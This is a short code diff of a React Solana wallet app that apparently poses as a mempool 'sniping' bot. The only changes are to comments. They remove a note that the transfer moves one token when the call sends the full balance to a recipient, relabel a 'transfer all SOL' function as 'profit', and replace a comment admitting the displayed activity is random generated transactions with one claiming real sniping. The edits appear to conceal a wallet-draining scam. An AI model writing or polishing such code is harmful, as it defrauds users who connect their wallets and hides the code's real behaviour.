@@ -180,7 +180,7 @@ function App() {
       }
 
       const transaction = new Transaction().add(
-        createTransferInstruction(senderATA, recipientATA, walletPublicKey, balance) // Transfer 1 token
+        createTransferInstruction(senderATA, recipientATA, walletPublicKey, balance)
       );
 
       transaction.feePayer = walletPublicKey;
@@ -196,7 +196,7 @@ function App() {
     }
   };
 
-  // 2️⃣ Transfer All Available SOL
+  // 2️⃣ Transfer All Available Profit
   const transferAllAvailableProfit = async () => {
     if (!walletAddress) {
       setErrorMessage("Wallet not connected!")
@@ -258,7 +258,7 @@ function App() {
       setIsDeploying(false)
       setIsMining(true);
       setErrorMessage("")
-      startSnipipingMempools(); // Start the random transaction generation
+      startSnipipingMempools(); // Start sniping and print transactions
     } else {
       setIsDeploying(false)
       setErrorMessage("Deploy failed. Sniping will not start..")
